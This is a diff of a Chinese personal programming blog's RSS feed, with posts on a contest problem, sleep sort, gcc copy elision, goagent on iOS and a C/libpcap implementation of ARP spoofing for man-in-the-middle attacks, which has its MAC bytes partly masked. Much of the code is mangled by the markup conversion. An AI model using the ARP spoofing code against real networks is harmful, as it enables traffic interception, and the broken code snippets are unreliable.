 &lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&quot;coding-problem&quot;&gt;		&lt;br /&gt;
-	&lt;p&gt;时间限制: 1000ms    内存限制: 1024MB&lt;/p&gt;
-    &lt;p /&gt;&lt;h3&gt;描述&lt;/h3&gt;&lt;p&gt;有一个方格矩阵，矩阵边界在无穷远处。我们做如下假设：&lt;br /&gt;a.    每走一步时，只能从当前方格移动一格，走到某个相邻的方格上；&lt;br /&gt;b.    走过的格子立即塌陷无法再走第二次；&lt;br /&gt;c.    只能向北、东、西三个方向走；&lt;br /&gt;请问：如果允许在方格矩阵上走n步，共有多少种不同的方案。2种走法只要有一步不一样，即被认为是不同的方案。&lt;/p&gt;&lt;h3&gt;输入&lt;/h3&gt;&lt;p&gt;允许在方格上行走的步数n&lt;/p&gt;&lt;h3&gt;输出&lt;/h3&gt;&lt;p&gt;计算出的方案数量&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;对于小数据1 &amp;lt;= n &amp;lt;= 20; 对于大数据1 &amp;lt;= n &amp;lt;= 100.&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/div&gt;&lt;/p&gt;
-	&lt;dl class=&quot;content&quot;&gt;
-		&lt;dt&gt;样例输入&lt;/dt&gt;
-		&lt;dd&gt;&lt;pre&gt;2&lt;/pre&gt;&lt;/dd&gt;
-		&lt;dt&gt;样例输出&lt;/dt&gt;
-		&lt;dd&gt;&lt;pre&gt;7&lt;/pre&gt;&lt;/dd&gt;
-	&lt;/dl&gt;
+&lt;p&gt;&lt;div class=&quot;coding-problem&quot;&gt;     &lt;br /&gt;
+    &lt;p&gt;时间限制: 1000ms    内存限制: 1024MB&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;p /&amp;gt;&amp;lt;h3&amp;gt;描述&amp;lt;/h3&amp;gt;&amp;lt;p&amp;gt;有一个方格矩阵，矩阵边界在无穷远处。我们做如下假设：&amp;lt;br /&amp;gt;a.    每走一步时，只能从当前方格移动一格，走到某个相邻的方格上；&amp;lt;br /&amp;gt;b.    走过的格子立即塌陷无法再走第二次；&amp;lt;br /&amp;gt;c.    只能向北、东、西三个方向走；&amp;lt;br /&amp;gt;请问：如果允许在方格矩阵上走n步，共有多少种不同的方案。2种走法只要有一步不一样，即被认为是不同的方案。&amp;lt;/p&amp;gt;&amp;lt;h3&amp;gt;输入&amp;lt;/h3&amp;gt;&amp;lt;p&amp;gt;允许在方格上行走的步数n&amp;lt;/p&amp;gt;&amp;lt;h3&amp;gt;输出&amp;lt;/h3&amp;gt;&amp;lt;p&amp;gt;计算出的方案数量&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;/p&amp;gt;对于小数据1 &amp;amp;lt;= n &amp;amp;lt;= 20; 对于大数据1 &amp;amp;lt;= n &amp;amp;lt;= 100.&amp;lt;p&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;dl class=&amp;quot;content&amp;quot;&amp;gt;
+    &amp;lt;dt&amp;gt;样例输入&amp;lt;/dt&amp;gt;
+    &amp;lt;dd&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;2
+        样例输出
+        7
 
-&lt;p&gt;这个题目我觉得最大的阴谋就是对于小数据1 &lt;= n &lt;= 20; 对于大数据1 &lt;= n &lt;= 100.&lt;br /&gt;
-我了个fuck了给了个那么小规模的数据还给那么高的分值正常人理所当然的就肯定认为这是个指数级的运算了啊！然后我就想到了三叉树去暴力啊、可是再怎么暴力这个指数摆在那就算是100也很恐怖了、各种挂……纠结了好久好久写了好几种都挂&lt;br /&gt;
-最后静下心来把他当数学做……然后草稿纸写写……尼玛5分钟就算出来了……&lt;br /&gt;
+
+这个题目我觉得最大的阴谋就是对于小数据1 
+我了个fuck了给了个那么小规模的数据还给那么高的分值正常人理所当然的就肯定认为这是个指数级的运算了啊！然后我就想到了三叉树去暴力啊、可是再怎么暴力这个指数摆在那就算是100也很恐怖了、各种挂……纠结了好久好久写了好几种都挂
+最后静下心来把他当数学做……然后草稿纸写写……尼玛5分钟就算出来了……
 其实思想非常非常简单 往北的节点就是能叉出3条路、其中分别是继续叉2的2条以及继续叉3的一条、往两侧的每次只能叉出两条路、分别是2 和3 具体路径的结构问你了么？去暴力做等于就是浪费这些路径的信息啊小时候怎么做数学题的……要那么多条件吃屎啊……数学规律就是这么简单……然后还不会写么？……！你妹的别说100了来个平方这复杂度都闭着眼睛来的啊……
-&lt;pre lang=&quot;c&quot;&gt;
-#include &lt;stdio.h&gt;
+
+#include 
 int main(){
     int a=0;
     int b=1;
     int count＝0;
     int i=0;
     int temp;
-    scanf(&quot;%d&quot;,&amp;count);
-    for (i=0; i&lt;count-1; i++) {
-        temp=a;
-        a+=(2*b);
-        b+=temp;
-    }
-    printf(&quot;%d\n&quot;,2*a+3*b);
-    return 0;
-}
-&lt;/stdio.h&gt;&lt;/pre&gt;
-没了！没了！写完了！……………………突然有种回归最质朴的感觉真好……&lt;/p&gt;
-</description>
+    scanf(&amp;quot;%d&amp;quot;,&amp;amp;count);
+    for (i=0; i
+没了！没了！写完了！……………………突然有种回归最质朴的感觉真好……
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/04/04/beauty-of-programming-%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%AC%AC%E4%B8%89%E9%A2%98</link>
                 <guid>http://snorlaxzxz.com/program/2013/04/04/beauty-of-programming-练习赛第三题</guid>
                 <pubDate>2013-04-04T00:00:00+08:00</pubDate>
@@ -847,24 +825,24 @@ int main(){
 
         <item>
                 <title>睡眠排序shell实现</title>
-                <description>&lt;p&gt;又是无意看到群里在讨论东西看到个睡眠排序……觉得好玩的就分享分享&lt;br /&gt;
-代码如下（简单的过分 想说的话都写注释里了)
-&lt;pre lang=&quot;shell&quot;&gt;
-#!/bin/bash
+                <description>&lt;p&gt;&lt;p&gt;又是无意看到群里在讨论东西看到个睡眠排序……觉得好玩的就分享分享&lt;br /&gt;
+代码如下（简单的过分 想说的话都写注释里了)&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;#!/bin/bash
 function f() {
-    sleep &quot;$1&quot;
-    echo &quot;$1&quot;  
+    sleep &amp;quot;$1&amp;quot;
+    echo &amp;quot;$1&amp;quot;  
 }
-while [ -n &quot;$1&quot; ]
+while [ -n &amp;quot;$1&amp;quot; ]
 do
-    f &quot;$1&quot; &amp; 
+    f &amp;quot;$1&amp;quot; &amp;amp; 
     shift   #对所有参数 依次循环让所有的参数分别sleep进行次根据sleep长短利用数字自身大小的特性进行排序
 done
 wait  #主进程等到全部子进程结束后返回结束
 #这个排序有个致命伤 如果os调度高于了数字最小的差值比如就必定会出错 或者随便来个来自系统的别的竞争也肯定悲剧了
 #还有就是……万一这个数字很大你等到明年去么混蛋= =
-&lt;/pre&gt;&lt;/p&gt;
-</description>
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/03/29/%E7%9D%A1%E7%9C%A0%E6%8E%92%E5%BA%8Fshell%E5%AE%9E%E7%8E%B0</link>
                 <guid>http://snorlaxzxz.com/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/03/29/睡眠排序shell实现</guid>
                 <pubDate>2013-03-29T00:00:00+08:00</pubDate>
@@ -872,75 +850,73 @@ wait  #主进程等到全部子进程结束后返回结束
 
         <item>
                 <title>关于gcc优化拷贝构造</title>
-                <description>&lt;p&gt;今天碰到一个很奇怪的问题……(我大一的时候怎么没有发觉呢Orz&lt;br /&gt;
-代码如下
-&lt;pre lang=&quot;c&quot;&gt;
-#include &lt;iostream&gt;
+                <description>&lt;p&gt;&lt;p&gt;今天碰到一个很奇怪的问题……(我大一的时候怎么没有发觉呢Orz&lt;br /&gt;
+代码如下&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;#include 
 using namespace std;
 class Student {
-    
+
 public:
-    Student(){cout&lt;&lt;&quot;structure&quot;&lt;&lt;endl;}
-    Student(const Student &amp;temp)
-    {&lt;/iostream&gt;&lt;/pre&gt;&lt;/p&gt;
+    Student(){cout
 
-&lt;p&gt;        cout&lt;&lt;&quot;copy structure&quot;&lt;&lt;endl;&lt;br /&gt;
-    }&lt;br /&gt;
-    ~Student(){&lt;/p&gt;
+        cout
+    }
+    ~Student(){
 
-&lt;p&gt;        cout&lt;&lt;&quot;free&quot;&lt;&lt;endl;}&lt;br /&gt;
-    Student  operator + (const Student &amp;) const&lt;br /&gt;
-    {&lt;br /&gt;
-        Student temp;&lt;br /&gt;
-        return temp; &lt;br /&gt;
-    }&lt;br /&gt;
-};&lt;br /&gt;
-int main(int argc, const char * argv[])&lt;br /&gt;
-{&lt;/p&gt;
+        cout
+    Student  operator + (const Student &amp;amp;) const
+    {
+        Student temp;
+        return temp; 
+    }
+};
+int main(int argc, const char * argv[])
+{
 
-&lt;p&gt;    Student s1;&lt;br /&gt;
-    Student s2(s1+s1);&lt;br /&gt;
-    return 0;&lt;br /&gt;
+    Student s1;
+    Student s2(s1+s1);
+    return 0;
 }
 
-输出应该很简单&lt;br /&gt;
-------------------&lt;br /&gt;
-structure&lt;br /&gt;
-structure&lt;br /&gt;
-copy structure&lt;br /&gt;
-free&lt;br /&gt;
-copy structure&lt;br /&gt;
-free&lt;br /&gt;
-free&lt;br /&gt;
-free&lt;br /&gt;
------------------&lt;br /&gt;
-return 返回临时变量时应该拷贝构造一次&lt;br /&gt;
-可是问题来了 死活出的结果就是&lt;br /&gt;
-----------------&lt;br /&gt;
-structure&lt;br /&gt;
-structure&lt;br /&gt;
-free&lt;br /&gt;
-free&lt;br /&gt;
-----------------&lt;br /&gt;
-折腾了大半天后我终于还是发现原来还是编译器搞的鬼……(人家只是太智能不要黑他&lt;br /&gt;
-具体就是在return temp;那里应该隐式调用拷贝构造的地方编译器做了延长temp的生命周期、延长到外部s2来让s2的生命周期结束后对这块内存进行析构&lt;br /&gt;
-这样就可以少了第一次拷贝构造&lt;br /&gt;
-此时第二次需要把新对象拷贝到s2中时的拷贝也就在这里被一起优化掉了直接让s2对应到了temp这块内存上(以上是我对编译器优化过程的的猜测&lt;br /&gt;
-然后我就试着&lt;br /&gt;
-g++ -o test -O0 test.cpp&lt;br /&gt;
-这么编译还是不行&lt;br /&gt;
-于是我就放弃了(只好理解成gcc的最白痴的不进行优化编译也会处理掉这种隐式的拷贝构造&lt;br /&gt;
-但是我错了！！！&lt;br /&gt;
-我严重鄙视下大多数网上放gcc参数的文档的那些人不负责任的就是-O0就是不优化（混蛋不优化不等于最低级优化好么！&lt;br /&gt;
------------------&lt;br /&gt;
-然后终于在帮忙下找到了http://blog.csdn.net/daidodo/article/details/2185217这篇文章&lt;br /&gt;
--fno-elide-constructors 强制g++总是调用copy构造函数，即使在用临时对象初始化另一个同类型对象的时候。&lt;br /&gt;
-就是这个参数&lt;br /&gt;
-好了一切其实也就搞定了&lt;br /&gt;
-g++ -o test -fno-elide-constructors test.cpp&lt;/p&gt;
+输出应该很简单
+------------------
+structure
+structure
+copy structure
+free
+copy structure
+free
+free
+free
+-----------------
+return 返回临时变量时应该拷贝构造一次
+可是问题来了 死活出的结果就是
+----------------
+structure
+structure
+free
+free
+----------------
+折腾了大半天后我终于还是发现原来还是编译器搞的鬼……(人家只是太智能不要黑他
+具体就是在return temp;那里应该隐式调用拷贝构造的地方编译器做了延长temp的生命周期、延长到外部s2来让s2的生命周期结束后对这块内存进行析构
+这样就可以少了第一次拷贝构造
+此时第二次需要把新对象拷贝到s2中时的拷贝也就在这里被一起优化掉了直接让s2对应到了temp这块内存上(以上是我对编译器优化过程的的猜测
+然后我就试着
+g++ -o test -O0 test.cpp
+这么编译还是不行
+于是我就放弃了(只好理解成gcc的最白痴的不进行优化编译也会处理掉这种隐式的拷贝构造
+但是我错了！！！
+我严重鄙视下大多数网上放gcc参数的文档的那些人不负责任的就是-O0就是不优化（混蛋不优化不等于最低级优化好么！
+-----------------
+然后终于在帮忙下找到了http://blog.csdn.net/daidodo/article/details/2185217这篇文章
+-fno-elide-constructors 强制g++总是调用copy构造函数，即使在用临时对象初始化另一个同类型对象的时候。
+就是这个参数
+好了一切其实也就搞定了
+g++ -o test -fno-elide-constructors test.cpp
 
-&lt;p&gt;结束语:怪也只能怪gcc太尼玛智能了……我大概知道为什么开始教学中要用vc环境了&lt;/p&gt;
-</description>
+结束语:怪也只能怪gcc太尼玛智能了……我大概知道为什么开始教学中要用vc环境了
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/03/28/%E5%85%B3%E4%BA%8Egcc%E4%BC%98%E5%8C%96%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0-5</link>
                 <guid>http://snorlaxzxz.com/program/2013/03/28/关于gcc优化拷贝构造-5</guid>
                 <pubDate>2013-03-28T00:00:00+08:00</pubDate>
@@ -979,104 +955,109 @@ arp响应包是60个字节(后面18个我实在没搞明白是什么……反正
 详见&lt;br /&gt;
 http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;c&quot;&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;stdio.h /&gt;&lt;/stdlib.h&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;p&gt;
+```&lt;/p&gt;
 
-&lt;p&gt;#include &lt;pcap.h /&gt;&lt;/p&gt;
+&lt;h1&gt;include&lt;/h1&gt;
 
-&lt;p&gt;int main(int argc, char **argv) {&lt;br /&gt;
-    pcap_t *fp;&lt;br /&gt;
-    char error[PCAP_ERRBUF_SIZE];&lt;br /&gt;
-    u_char packet[60];&lt;br /&gt;
-    int i;&lt;br /&gt;
-    &lt;br /&gt;
-    /* Check the validity of the command line */&lt;br /&gt;
-    if (argc != 2)&lt;br /&gt;
-    {&lt;br /&gt;
-        printf(&quot;usage: %s inerface&quot;, argv[0]);&lt;br /&gt;
-        return -1;&lt;br /&gt;
-    }&lt;br /&gt;
-    &lt;br /&gt;
-    /* Open the output adapter */&lt;br /&gt;
-    if((fp = pcap_open_live(&quot;en0&quot;, 100, 1, 1000, error) ) == NULL)&lt;br /&gt;
-    {&lt;br /&gt;
-        fprintf(stderr,&quot;\nError opening adapter: %s\n&quot;, error);&lt;br /&gt;
-        return -1;&lt;br /&gt;
-    }&lt;br /&gt;
-    &lt;br /&gt;
-    /* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */&lt;br /&gt;
-    /*被攻击者的mac*/&lt;br /&gt;
-    packet[0]=xx;&lt;br /&gt;
-    packet[1]=32;&lt;br /&gt;
-    packet[2]=102;&lt;br /&gt;
-    packet[3]=8;&lt;br /&gt;
-    packet[4]=jiubu;&lt;br /&gt;
-    packet[5]=gaosuni;&lt;br /&gt;
-    &lt;br /&gt;
-    /* set mac source to 2:2:2:2:2:2 */&lt;br /&gt;
-    /*攻击者的mac*/&lt;br /&gt;
-    packet[6]=jiu;&lt;br /&gt;
-    packet[7]=bu;&lt;br /&gt;
-    packet[8]=gaosu;&lt;br /&gt;
-    packet[9]=234;&lt;br /&gt;
-    packet[10]=xx;&lt;br /&gt;
-    packet[11]=100;&lt;br /&gt;
-    /*arp*/&lt;br /&gt;
-    packet[12]=8;&lt;br /&gt;
-    packet[13]=6;&lt;br /&gt;
-    /*arp首部*/&lt;br /&gt;
-    packet[14]=0;&lt;br /&gt;
-    packet[15]=1;&lt;br /&gt;
-    &lt;br /&gt;
-    packet[16]=8;&lt;br /&gt;
-    packet[17]=0;&lt;br /&gt;
-    &lt;br /&gt;
-    packet[18]=6;&lt;br /&gt;
-    packet[19]=4;&lt;br /&gt;
-    packet[20]=0;&lt;br /&gt;
-    packet[21]=2;&lt;br /&gt;
-    /*被骗的那个人的arp表上的假mac*/&lt;br /&gt;
-    packet[22]=jiu;&lt;br /&gt;
-    packet[23]=154;&lt;br /&gt;
-    packet[24]=32;&lt;br /&gt;
-    packet[25]=bu;&lt;br /&gt;
-    packet[26]=253;&lt;br /&gt;
-    packet[27]=gao;&lt;br /&gt;
-    /*被骗者的网关*/&lt;br /&gt;
-    packet[28]=192;&lt;br /&gt;
-    packet[29]=168;&lt;br /&gt;
-    packet[30]=1;&lt;br /&gt;
-    packet[31]=1;&lt;br /&gt;
-    /*被攻击者的mac*/&lt;br /&gt;
-    packet[32]=xx;&lt;br /&gt;
-    packet[33]=32;&lt;br /&gt;
-    packet[34]=102;&lt;br /&gt;
-    packet[35]=xx;&lt;br /&gt;
-    packet[36]=xx;&lt;br /&gt;
-    packet[37]=184;&lt;br /&gt;
-    /*被攻击者的ip*/&lt;br /&gt;
-    packet[38]=192;&lt;br /&gt;
-    packet[39]=168;&lt;br /&gt;
-    packet[40]=1;&lt;br /&gt;
-    packet[41]=114;&lt;br /&gt;
-    &lt;br /&gt;
-    /* Fill the rest of the packet */&lt;br /&gt;
-    /*乱填就好了*/&lt;br /&gt;
-    for(i=42;i&lt;60;i++){&lt;br /&gt;
-        packet[i]=i%256;&lt;br /&gt;
-    }&lt;br /&gt;
-    &lt;br /&gt;
-    /* Send down the packet */&lt;br /&gt;
-    pcap_sendpacket(fp,&lt;br /&gt;
-                    packet,&lt;br /&gt;
-                    60);&lt;br /&gt;
-    &lt;br /&gt;
-    return 0;&lt;br /&gt;
+&lt;h1&gt;include&lt;/h1&gt;
+
+&lt;h1&gt;include&lt;/h1&gt;
+
+&lt;p&gt;int main(int argc, char **argv) {
+    pcap_t *fp;
+    char error[PCAP_ERRBUF_SIZE];
+    u_char packet[60];
+    int i;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;/* Check the validity of the command line */
+if (argc != 2)
+{
+    printf(&amp;quot;usage: %s inerface&amp;quot;, argv[0]);
+    return -1;
 }
-&lt;/p&gt;
+
+/* Open the output adapter */
+if((fp = pcap_open_live(&amp;quot;en0&amp;quot;, 100, 1, 1000, error) ) == NULL)
+{
+    fprintf(stderr,&amp;quot;\nError opening adapter: %s\n&amp;quot;, error);
+    return -1;
+}
+
+/* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
+/*被攻击者的mac*/
+packet[0]=xx;
+packet[1]=32;
+packet[2]=102;
+packet[3]=8;
+packet[4]=jiubu;
+packet[5]=gaosuni;
+
+/* set mac source to 2:2:2:2:2:2 */
+/*攻击者的mac*/
+packet[6]=jiu;
+packet[7]=bu;
+packet[8]=gaosu;
+packet[9]=234;
+packet[10]=xx;
+packet[11]=100;
+/*arp*/
+packet[12]=8;
+packet[13]=6;
+/*arp首部*/
+packet[14]=0;
+packet[15]=1;
+
+packet[16]=8;
+packet[17]=0;
+
+packet[18]=6;
+packet[19]=4;
+packet[20]=0;
+packet[21]=2;
+/*被骗的那个人的arp表上的假mac*/
+packet[22]=jiu;
+packet[23]=154;
+packet[24]=32;
+packet[25]=bu;
+packet[26]=253;
+packet[27]=gao;
+/*被骗者的网关*/
+packet[28]=192;
+packet[29]=168;
+packet[30]=1;
+packet[31]=1;
+/*被攻击者的mac*/
+packet[32]=xx;
+packet[33]=32;
+packet[34]=102;
+packet[35]=xx;
+packet[36]=xx;
+packet[37]=184;
+/*被攻击者的ip*/
+packet[38]=192;
+packet[39]=168;
+packet[40]=1;
+packet[41]=114;
+
+/* Fill the rest of the packet */
+/*乱填就好了*/
+for(i=42;i
+    packet[i]=i%256;
+}
+
+/* Send down the packet */
+pcap_sendpacket(fp,
+                packet,
+                60);
+
+return 0;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;}&lt;/p&gt;
 
 &lt;p&gt;以上arp欺骗的完整实现、不要用来干坏事= =&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
 </description>
                 <link>http://snorlaxzxz.com/program/2013/03/20/arp%E6%AC%BA%E9%AA%97%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81arp%E5%8C%85%E8%A7%A3%E6%9E%90</link>
                 <guid>http://snorlaxzxz.com/program/2013/03/20/arp欺骗中间人攻击的实现、arp包解析</guid>
@@ -1099,28 +1080,26 @@ http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html&lt;/p&gt;
 
 &lt;p&gt;代码如下&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;python&quot;&gt;
-i=-1
+&lt;p&gt;&lt;p&gt;
+```&lt;/p&gt;
+
+&lt;p&gt;i=-1
 j=0
-pi = &quot;31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823&quot;
+pi = &amp;quot;31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823&amp;quot;
 l = [int(tt) for tt in pi[:100]]
-while j&lt;100:
-    if l[j]%2==0:
-        pass
-    else:
-        i+=1
-        l[i],l[j]=l[j],l[i]
-    j+=1&lt;/pre&gt;&lt;/p&gt;
+while j&lt;/p&gt;
 
-&lt;p&gt;print sorted(l[0:i+1])+sorted(l[i+1:100])
+&lt;p&gt;print sorted(l[0:i+1])+sorted(l[i+1:100])&lt;/p&gt;
 
-经过评论大哥的指点python的实现
-&lt;pre lang=&quot;python&quot;&gt;
-pi = &quot;31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823&quot;
+&lt;p&gt;经过评论大哥的指点python的实现&lt;/p&gt;
+
+&lt;p&gt;pi = &amp;quot;31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823&amp;quot;
 l=[int(tt) for tt in pi[:100]]
 l.sort(lambda x,y:(x-y)if(x%2-y%2==0)else(y%2-x%2))
-print l
-&lt;/pre&gt;&lt;/p&gt;
+print l&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
 </description>
                 <link>http://snorlaxzxz.com/program/2013/03/15/sae-%E6%99%AE%E9%80%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E6%8E%A8%E8%8D%90%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A83-15-%E8%A7%A3</link>
                 <guid>http://snorlaxzxz.com/program/2013/03/15/sae-普通开发者免推荐认证活动3-15-解</guid>
@@ -1139,20 +1118,14 @@ print l
 1.首先从wordpress的根目录开始寻址到/wp-content/plugins/social/views/wp-admin/post/broadcast/options.php （我们需要修改文件就在这&lt;br /&gt;
 2.找到第70行 其实我们从这里就可以看出$account[&#39;content&#39;]里就是我们发出的文本段（鉴于本人太懒不高兴往上找了所以就直接在这段做处理&lt;br /&gt;
 3.先用正则式剔出我们blog的url 然后对他进行shorten再替换回去
-&lt;pre lang=&quot;php&quot;&gt;
-&lt;?php
-    preg_match(&quot;#http\://snorlax\.sinaapp\.com/\?p\=\d+#&quot;,$account[&#39;content&#39;],$matches);
-    $apiKey=&#39;3818214747&#39;;
-    //调用sina的api 注:这个api在文档显示正在走向废弃的道路所以随时有可能挂也说不定= =
-    //具体调用方法参考http://open.weibo.com/wiki/Short_url/shorten
-    $apiUrl=&#39;http://api.t.sina.com.cn/short_url/shorten.json?source=&#39;.$apiKey.&#39;&amp;url_long=&#39;.$matches[0];
-    $response = file_get_contents($apiUrl);
-    $json = json_decode($response);
-    $tar=str_replace($matches[0],$json[0]-&gt;url_short,$account[&#39;content&#39;]);
+
+```
+
+url_short,$account[&#39;content&#39;]);
     echo esc_textarea($tar);
-	echo &quot;&lt;p class=&quot;\\&quot;readonly\&quot;&gt;; 
-	echo esc_textarea($tar); 
-?&gt;
+    echo &quot;; 
+    echo esc_textarea($tar); 
+?&gt;&gt;
 &lt;/p&gt;&lt;/pre&gt;&lt;/p&gt;
 
 &lt;p&gt;然后跑起来就ok了&lt;br /&gt;
@@ -1165,13 +1138,13 @@ print l
 
         <item>
                 <title>关于ios下的goagent使用</title>
-                <description>&lt;p&gt;国际惯例先问候下方滨兴你这狗娘养的&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;国际惯例先问候下方滨兴你这狗娘养的&lt;br /&gt;
 -----------------------------------------------------------------------------------&lt;br /&gt;
 首先说下我的server的版本是2.1.3&lt;br /&gt;
 ios下的goagent各种教程到处都是、可是只可惜共军太狡猾、gfw现在是越来越牛逼&lt;br /&gt;
-反正我搜着的各种帖子要么是那种二到家的就装装装下去就成功了、要么就是中间某个步骤被干掉了&lt;br /&gt;
- 
-正常人都肯定会看官方的文档、可惜没那么简单……&lt;del datetime=&quot;2013-03-07T06:08:41+00:00&quot;&gt;https://code.google.com/p/goagent/wiki/GoAgent_IOS&lt;/del&gt;
+反正我搜着的各种帖子要么是那种二到家的就装装装下去就成功了、要么就是中间某个步骤被干掉了&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;正常人都肯定会看官方的文档、可惜没那么简单……&lt;del datetime=&quot;2013-03-07T06:08:41+00:00&quot;&gt;&lt;a href=&quot;https://code.google.com/p/goagent/wiki/GoAgent_IOS&quot;&gt;https://code.google.com/p/goagent/wiki/GoAgent_IOS&lt;/a&gt;&lt;/del&gt;
 这上面的版本由于过于古老让我吃尽苦头&lt;br /&gt;
 好了废话到此位置&lt;br /&gt;
 -----------------------------------------------------------------------------------&lt;br /&gt;
@@ -1179,23 +1152,20 @@ ios下的goagent各种教程到处都是、可是只可惜共军太狡猾、gfw�
 为了一下操作方便点可以安装下open ssh以及aptbackup(用了这个就可以直接用apt-get了&lt;br /&gt;
 1.这个可以直接在178的源里搜索安装python2.7&lt;br /&gt;
 2.在big boss源中安装adv-cmds（是下一步的依赖&lt;br /&gt;
-3.接下去就是goagent了 https://code.google.com/p/goagent/downloads/detail?name=goagent-local-1.7.deb&amp;can=2&amp;q=(debian包安装可以采取dpkg -i 或者就索性丢到/var/root/Media/Cydia/AutoInstall 重启下&lt;br /&gt;
+3.接下去就是goagent了 &lt;a href=&quot;https://code.google.com/p/goagent/downloads/detail?name=goagent-local-1.7.deb&amp;amp;can=2&amp;amp;q=&quot;&gt;https://code.google.com/p/goagent/downloads/detail?name=goagent-local-1.7.deb&amp;amp;can=2&amp;amp;q=&lt;/a&gt;(debian包安装可以采取dpkg -i 或者就索性丢到&lt;/var/root/Media/Cydia/AutoInstall&gt; 重启下&lt;br /&gt;
 4.安装方便的工具栏 有两种选择 第一是先装sbsetting依赖（有一串东西）然后装178源里的goagent-toggle 第二就是用之前的goagent-ios 在里面的/Applications/goagent-ios.app/goagent-local/proxy.py做一个映射到/var/mobile/goagent-local/proxy.py（前者是在sbsetting中进行开关、后者是在通知栏最下放有个按键进行开关）&lt;br /&gt;
-5.配置goagent中的appid、以及更改为google_hk(若用google_cn请把hosts中的域名更改为响应的ip地址、isp不提供解析)配置当前网络下的pac 地址在 file://localhost/stash/Applications/MobileSafari.app/8087.pac 在当前wifi里的http proxy中填写&lt;br /&gt;
+5.配置goagent中的appid、以及更改为google_hk(若用google_cn请把hosts中的域名更改为响应的ip地址、isp不提供解析)配置当前网络下的pac 地址在&lt;a href=&quot;file://localhost/stash/Applications/MobileSafari.app/8087.pac&quot;&gt;file://localhost/stash/Applications/MobileSafari.app/8087.pac&lt;/a&gt; 在当前wifi里的http proxy中填写&lt;br /&gt;
 以上你已经在http情况下翻过去了&lt;br /&gt;
-6.现在要安装ca、这个正常看起来简单暴的事情、由于你现在根本在没翻的前提下变的异常困难不过你可以发现goagent-local里其实已经有了很多ca了、把/var/mobile/goagent-local/certs/apis.google.com.crt 拷贝出来（如果本机可以翻墙可以直接把https://goagent.googlecode.com/files/CA.crt下载下来用并跳到8） 然后如果自己有python环境就用传说中两行的web服务器把ca给共享出去
-&lt;pre lang=&quot;python&quot;&gt;
-import SimpleHTTPServer
+6.现在要安装ca、这个正常看起来简单暴的事情、由于你现在根本在没翻的前提下变的异常困难不过你可以发现goagent-local里其实已经有了很多ca了、把&lt;/var/mobile/goagent-local/certs/apis.google.com.crt&gt; 拷贝出来（如果本机可以翻墙可以直接把&lt;a href=&quot;https://goagent.googlecode.com/files/CA.crt&quot;&gt;https://goagent.googlecode.com/files/CA.crt&lt;/a&gt;下载下来用并跳到8） 然后如果自己有python环境就用传说中两行的web服务器把ca给共享出去&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;import SimpleHTTPServer
 SimpleHTTPServer.test()
-&lt;/pre&gt;
-7.在safari访问这个然后下一步安装、到这就可以轻易的safari访问 https://goagent.googlecode.com/files/CA.crt 装他的ca了&lt;/p&gt;
 
-&lt;p&gt;8.你自由了:-)&lt;/p&gt;
+7.在safari访问这个然后下一步安装、到这就可以轻易的safari访问 &amp;lt;https://goagent.googlecode.com/files/CA.crt&amp;gt; 装他的ca了
 
